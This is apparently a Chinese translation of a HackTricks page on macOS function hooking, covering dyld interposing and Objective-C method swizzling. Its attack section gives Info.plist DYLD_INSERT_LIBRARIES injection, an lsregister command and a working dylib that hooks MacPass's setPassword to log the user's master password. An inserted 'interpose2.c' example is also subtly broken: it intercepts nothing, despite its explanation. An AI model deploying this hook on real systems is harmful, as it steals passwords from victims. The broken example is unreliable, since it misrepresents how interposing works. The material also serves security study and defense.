# macOS函数挂钩

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 函数插入

创建一个包含指向**原始**和**替代**函数的**函数指针**元组的**dylib**，并带有一个**`__interpose`**部分（或带有**`S_INTERPOSING`**标志的部分）。

然后，使用**`DYLD_INSERT_LIBRARIES`**注入dylib（插入必须在主应用程序加载之前进行）。显然，[**对使用**`DYLD_INSERT_LIBRARIES`**的限制也适用于此处**](../macos-proces-abuse/macos-library-injection/#check-restrictions)。

### 插入printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% tab title="interpose2.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

// Define the function pointer type for the original function
typedef int (*orig_open_type)(const char *pathname, int flags);

// Define the function pointer type for the interposed function
typedef int (*interposed_open_type)(const char *pathname, int flags);

// Define the interposed function
int interposed_open(const char *pathname, int flags) {
    printf("Interposed open called with pathname: %s\n", pathname);
    
    // Get the handle to the original function
    void *handle = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
    orig_open_type orig_open = (orig_open_type)dlsym(handle, "open");
    
    // Call the original function
    int result = orig_open(pathname, flags);
    
    // Cleanup
    dlclose(handle);
    
    return result;
}

// Define the constructor function
__attribute__((constructor))
void my_init() {
    // Get the handle to the interposed function
    void *handle = dlopen("/usr/lib/libSystem.B.dylib", RTLD_NOW);
    interposed_open_type interposed_open = (interposed_open_type)dlsym(handle, "open");
    
    // Get the handle to the original function
    orig_open_type orig_open = (orig_open_type)dlsym(RTLD_NEXT, "open");
    
    // Check if the interposed function is already set
    if (interposed_open != orig_open) {
        printf("Interposed function already set\n");
        return;
    }
    
    // Set the interposed function
    if (orig_open != NULL) {
        printf("Setting interposed function\n");
        interposed_open = orig_open;
    } else {
        printf("Failed to get handle to original function\n");
    }
    
    // Cleanup
    dlclose(handle);
}
```

这是一个使用函数钩子技术的示例代码。它演示了如何在macOS上使用函数钩子来拦截和修改`open`函数的行为。

代码中定义了两个函数指针类型：`orig_open_type`用于指向原始函数，`interposed_open_type`用于指向拦截函数。

`interposed_open`函数是拦截函数的实现。它会在被拦截的`open`函数被调用时被执行，并打印出传入的`pathname`参数。然后，它会获取到原始函数的句柄，并调用原始函数。最后，清理句柄并返回结果。

`my_init`函数是构造函数，它会在程序加载时被自动调用。它首先获取到拦截函数和原始函数的句柄，然后检查拦截函数是否已经设置。如果已经设置，则打印一条消息并返回。否则，将原始函数设置为拦截函数。最后，清理句柄。

通过使用这个示例代码，我们可以拦截和修改`open`函数的行为，以实现自定义的逻辑。

{% endtab %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## 方法交换

在ObjectiveC中，方法的调用方式如下：**`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

需要提供**对象**、**方法**和**参数**。当调用方法时，会使用函数**`objc_msgSend`**发送一条消息：`int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

对象是**`someObject`**，方法是**`@selector(method1p1:p2:)`**，参数是**value1**和**value2**。

根据对象的结构，可以找到一个包含方法**名称**和**指向方法代码的指针**的方法数组。

{% hint style="danger" %}
请注意，由于方法和类是根据名称访问的，这些信息存储在二进制文件中，因此可以使用`otool -ov </path/bin>`或[`class-dump </path/bin>`](https://github.com/nygard/class-dump)来检索它们。
{% endhint %}

### 访问原始方法

可以访问方法的信息，例如名称、参数数量或地址，如下面的示例所示：
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### 使用method\_exchangeImplementations进行方法交换

函数**`method_exchangeImplementations`**允许将一个函数的实现地址**更改为另一个函数**。

{% hint style="danger" %}
因此，当调用一个函数时，执行的是另一个函数。
{% endhint %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really coode is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% hint style="warning" %}
在这种情况下，如果**合法方法的实现代码验证**了**方法名称**，它可以**检测**到这种交换并阻止其运行。

以下技术没有此限制。
{% endhint %}

### 使用method\_setImplementation进行方法交换

之前的格式很奇怪，因为你正在将一个方法的实现更改为另一个方法。使用函数**`method_setImplementation`**，您可以将一个方法的实现更改为另一个方法。

只需记住，如果您要在新的实现中调用原始实现的地址，请在覆盖它之前将其存储起来，因为稍后要定位该地址会更加复杂。
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## 钩子攻击方法论

在本页面中，讨论了不同的函数钩子方式。然而，它们都涉及到在进程内运行代码来进行攻击。

为了做到这一点，最简单的技术是通过环境变量或劫持来注入[Dyld](../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)。然而，我猜这也可以通过[Dylib进程注入](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)来实现。

然而，这两种选项都**仅限于**未受保护的二进制文件/进程。请查看每种技术以了解更多限制。

然而，函数钩子攻击非常具体，攻击者会使用这种方法来从进程内部窃取敏感信息（如果不是这样，你只会进行进程注入攻击）。而这些敏感信息可能位于用户下载的应用程序中，例如MacPass。

因此，攻击者的方式要么是找到一个漏洞，要么是剥离应用程序的签名，通过应用程序的Info.plist注入**`DYLD_INSERT_LIBRARIES`**环境变量，添加类似以下内容：
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
然后**重新注册**应用程序：

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

在该库中添加挂钩代码以外泄信息：密码、消息...

{% hint style="danger" %}
请注意，在较新版本的 macOS 中，如果您**剥离应用程序二进制文件的签名**并且该应用程序之前已被执行过，macOS将**不再执行该应用程序**。
{% endhint %}

#### 库示例
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## 参考资料

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
